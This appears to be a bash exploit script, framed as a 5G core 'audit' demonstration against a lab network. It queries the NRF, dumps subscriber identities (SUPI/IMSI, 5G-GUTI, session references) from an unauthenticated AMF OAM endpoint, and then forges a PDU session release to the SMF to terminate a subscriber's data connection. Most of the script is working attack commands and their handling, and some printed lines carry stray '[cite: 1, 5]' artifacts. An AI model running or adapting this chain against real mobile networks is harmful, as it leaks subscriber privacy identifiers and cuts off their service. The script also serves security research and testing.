#!/usr/bin/env bash
set -e

# Target Network Function Endpoints (Mapped via 10.0.0.0/24 Core Subnet)
AMF_SBI="http://10.0.0.18:8000"
NRF_SBI="http://10.0.0.10:8000"
SMF_SBI="http://10.0.0.2:8000"

CYAN='\033[0;36m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BOLD='\033[1m'
NC='\033[0m' # No Color

prompt_approval() {
    local phase_title="$1"
    echo -e "${YELLOW}------------------------------------------------------------${NC}"
    echo -e "${BOLD}[APPROVAL REQUIRED] Ready to execute: ${phase_title}${NC}"
    read -p "Press [Enter] to approve and execute (or type 's' to skip): " USER_CHOICE
    echo -e "${YELLOW}------------------------------------------------------------${NC}"
    if [[ "$USER_CHOICE" =~ ^[Ss]$ ]]; then
        echo -e "${RED}[*] Skipping this phase upon user request.${NC}\n"
        return 1
    fi
    return 0
}

clear
echo -e "${CYAN}======================================================================"
echo "      5G SERVICE-BASED ARCHITECTURE (SBA) CONTROL-PLANE AUDIT         "
echo "        Target: Access and Mobility Management Function (AMF)         "
echo -e "======================================================================${NC}"
echo -e "${BOLD}Vulnerability Overview:${NC}"
echo "In 3GPP 5G Standalone (SA), Network Functions talk via HTTP/2 REST APIs."
echo "When mutual TLS (mTLS) and OAuth2 token validation are disabled in core"
echo "deployments (oauth: false), internal APIs become unauthenticated and exposed."
echo ""

# --------------------------------------------------------------------------
# PREREQUISITE CHECK: Routing & SBI Reachability
# --------------------------------------------------------------------------
echo -e "${BOLD}[Prerequisite Check] Verifying Control-Plane Reachability${NC}"
echo "Command to run: ping -c 1 -W 2 10.0.0.18"
if ping -c 1 -W 2 10.0.0.18 >/dev/null 2>&1; then
    echo -e "${GREEN}[+] Reachability verified: Core SBI (10.0.0.18) is responding.${NC}\n"
else
    echo -e "${RED}[-] Error: Cannot reach AMF SBI (10.0.0.18).${NC}"
    echo "    Verify that 'sudo ./setup_and_start_ue.sh' was run to establish the route."
    exit 1
fi

# --------------------------------------------------------------------------
# PHASE 1: NRF RECONNAISSANCE & AMF DISCOVERY
# --------------------------------------------------------------------------
echo -e "${CYAN}======================================================================"
echo " PHASE 1: Network Repository Function (NRF) Reconnaissance            "
echo -e "======================================================================${NC}"
echo -e "${BOLD}3GPP Specification Reference:${NC} 3GPP TS 29.510 (Nnrf_NFManagement Service)"
echo -e "${BOLD}Why This Matters:${NC}"
echo "The NRF is the central registry for all 5G Network Functions. Under 3GPP"
echo "specs, any NF queries NRF to locate peers. Without OAuth2, any attacker"
echo "on the transport network can dump all registered AMFs, IP bindings, and UUIDs."
echo ""
CMD_PHASE1="curl -s -X GET \"$NRF_SBI/nnrf-nfm/v1/nf-instances?nf-type=AMF\" -H \"Accept: application/json\""
echo -e "${BOLD}Command to run:${NC}"
echo -e "  ${GREEN}$CMD_PHASE1${NC}"
echo -e "${BOLD}Expected Outcome:${NC}"
echo "NRF will return HTTP 200 containing registered AMF instance profiles, supported"
echo "PLMNs (208/93), and available service endpoints (namf-comm, namf-oam)."
echo ""

if prompt_approval "Phase 1: NRF Query"; then
    echo -e "${BOLD}[+] Executing command...${NC}"
    PHASE1_RESP=$(eval "$CMD_PHASE1" || true)
    if [ -n "$PHASE1_RESP" ] && [ "$PHASE1_RESP" != "null" ]; then
        echo -e "${GREEN}[+] Response received from NRF:${NC}"
        echo "$PHASE1_RESP" | jq . 2>/dev/null || echo "$PHASE1_RESP"
    else
        echo -e "${YELLOW}[!] NRF returned no active AMF profile array. Proceeding to direct AMF query.${NC}"
    fi
    echo ""
fi

# --------------------------------------------------------------------------
# PHASE 2: UNAUTHENTICATED AMF SUBSCRIBER CONTEXT EXTRACTION (namf-oam)
# --------------------------------------------------------------------------
echo -e "${CYAN}======================================================================"
echo " PHASE 2: Unauthenticated Subscriber Context Extraction (namf-oam)     "
echo -e "======================================================================${NC}"
echo -e "${BOLD}3GPP Specification Reference:${NC} 3GPP TS 29.518 (Namf_OAM Service)"
echo -e "${BOLD}Why This Matters:${NC}"
echo "The Namf_OAM service provides operational management interfaces. The endpoint"
echo "'/registered-ue-context' exposes confidential mobile subscriber states"
echo "directly from AMF volatile memory. This leaks sensitive subscriber privacy"
echo "identifiers without triggering radio or core alarms."
echo ""
CMD_PHASE2="curl -s -X GET \"$AMF_SBI/namf-oam/v1/registered-ue-context\" -H \"Accept: application/json\""
echo -e "${BOLD}Command to run:${NC}"
echo -e "  ${GREEN}$CMD_PHASE2${NC}"
echo -e "${BOLD}Expected Outcome:${NC}"
echo "An HTTP 200 JSON dump containing all registered mobile devices, exposing:"
echo "  1. SUPI / IMSI (Permanent subscriber identity)"
echo "  2. 5G-GUTI (Globally Unique Temporary Identifier)"
echo "  3. TAC (Tracking Area Code where the UE is located)"
echo "  4. SmContextRef (Unique session handle needed for session hijacking/DoS)"
echo ""

SUPI=""
GUTI=""
SM_REF=""
PDU_ID=""

if prompt_approval "Phase 2: AMF OAM Context Leak"; then
    echo -e "${BOLD}[+] Executing command...${NC}"
    PHASE2_RESP=$(eval "$CMD_PHASE2")

    if [ -z "$PHASE2_RESP" ] || [ "$PHASE2_RESP" == "null" ] || [ "$PHASE2_RESP" == "[]" ]; then
        echo -e "${RED}[-] No registered UEs found in AMF memory.${NC}"
        echo "    Ensure your UERANSIM UE is running and registered."
        exit 1
    fi

    echo -e "${GREEN}[+] Successfully dumped subscriber context from AMF:${NC}"
    echo "$PHASE2_RESP" | jq .

    # Extract target values
    SUPI=$(echo "$PHASE2_RESP" | jq -r '.[0].Supi')
    GUTI=$(echo "$PHASE2_RESP" | jq -r '.[0].Guti')
    SM_REF=$(echo "$PHASE2_RESP" | jq -r '.[0].PduSessions[0].SmContextRef // empty')
    PDU_ID=$(echo "$PHASE2_RESP" | jq -r '.[0].PduSessions[0].PduSessionId // 1')
    DNN=$(echo "$PHASE2_RESP" | jq -r '.[0].PduSessions[0].Dnn // "internet"')

    echo ""
    echo -e "${BOLD}============================================================${NC}"
    echo -e "${BOLD} [!] EXFILTRATED TARGET PARAMETERS:${NC}"
    echo -e "     - ${BOLD}Target SUPI (IMSI):${NC}  ${GREEN}$SUPI${NC}"
    echo -e "     - ${BOLD}Target 5G-GUTI:${NC}       ${GREEN}$GUTI${NC}"
    echo -e "     - ${BOLD}Active Data Network:${NC}  ${GREEN}$DNN (PDU ID: $PDU_ID)${NC}"
    echo -e "     - ${BOLD}Target SmContextRef:${NC}  ${GREEN}$SM_REF${NC}"
    echo -e "${BOLD}============================================================${NC}\n"
fi

# --------------------------------------------------------------------------
# PHASE 3: UNAUTHORIZED USER-PLANE SESSION TERMINATION (PDU TEARDOWN)
# --------------------------------------------------------------------------
echo -e "${CYAN}======================================================================"
echo " PHASE 3: Unauthenticated PDU Session Teardown (Denial of Service)    "
echo -e "======================================================================${NC}"
echo -e "${BOLD}3GPP Specification Reference:${NC} 3GPP TS 29.502 (Nsmf_PDUSession Service)"
echo -e "${BOLD}Why This Matters:${NC}"
echo "Using the leaked 'SmContextRef' obtained from AMF in Phase 2, an attacker can"
echo "cross over to the Session Management Function (SMF) and forge an unauthenticated"
echo "release request. The SMF instructs the UPF to wipe the GTP tunnel rules,"
echo "instantly killing the victim's internet connection while the UE still believes"
echo "it is registered to the cell."
echo ""

if [ -z "$SM_REF" ] || [ "$SM_REF" == "null" ]; then
    echo -e "${YELLOW}[!] No active SmContextRef found. Cannot demonstrate Phase 3.${NC}"
    exit 0
fi

CMD_PHASE3="curl -i -X POST \"$SMF_SBI/nsmf-pdusession/v1/sm-contexts/${SM_REF}/release\" \\
  -H \"Content-Type: application/json\" \\
  -d '{\"cause\": \"PDU_SESSION_STATUS_MISMATCH\"}'"

echo -e "${BOLD}Command to run:${NC}"
echo -e "${GREEN}$CMD_PHASE3${NC}"
echo ""
echo -e "${BOLD}Expected Outcome:${NC}"
echo "  1. SMF returns HTTP 200 OK or 204 No Content, confirming session tear-down."
echo "  2. The UPF hardware/kernel pipeline immediately drops packet forwarding[cite: 5]."
echo "  3. Running 'ping -I uesimtun0 8.8.8.8' will immediately fail with 100% loss[cite: 1, 5]."
echo ""

if prompt_approval "Phase 3: SMF Session Release Exploit"; then
    echo -e "${BOLD}[+] Executing unauthenticated session release against SMF...${NC}"
    HTTP_RESPONSE=$(curl -s -w "\nHTTP_STATUS:%{http_code}" -X POST \
      "$SMF_SBI/nsmf-pdusession/v1/sm-contexts/${SM_REF}/release" \
      -H "Content-Type: application/json" \
      -d '{"cause": "PDU_SESSION_STATUS_MISMATCH"}')

    HTTP_STATUS=$(echo "$HTTP_RESPONSE" | grep "HTTP_STATUS" | cut -d':' -f2)
    RESPONSE_BODY=$(echo "$HTTP_RESPONSE" | sed '/HTTP_STATUS/d')

    echo -e "${BOLD}[+] Server Response Code:${NC} HTTP $HTTP_STATUS"
    if [ -n "$RESPONSE_BODY" ]; then
        echo -e "${BOLD}[+] Response Body:${NC}"
        echo "$RESPONSE_BODY"
    fi
    echo ""

    # --------------------------------------------------------------------------
    # VERIFICATION: Test whether the 5G data tunnel survived
    # --------------------------------------------------------------------------
    echo -e "${BOLD}[*] Verifying Data-Plane Disruption on 'uesimtun0'...${NC}"
    echo "Command to run: ping -c 3 -W 1 -I uesimtun0 8.8.8.8"
    if ping -c 3 -W 1 -I uesimtun0 8.8.8.8 >/dev/null 2>&1; then
        echo -e "${YELLOW}[?] Warning: Data plane is still responding. Inspect SMF server logs.${NC}"
    else
        echo -e "${GREEN}${BOLD}[EXPLOIT CONFIRMED SUCCESSFUL]${NC}"
        echo -e "Packets to 8.8.8.8 through 'uesimtun0' timed out (100% packet loss)!"
        echo -e "The active subscriber's 5G session has been terminated remotely[cite: 1, 5]."
    fi
fi

echo ""
echo -e "${CYAN}======================================================================"
echo " Audit and Exploit Demonstration Run Complete                         "
echo -e "======================================================================${NC}"
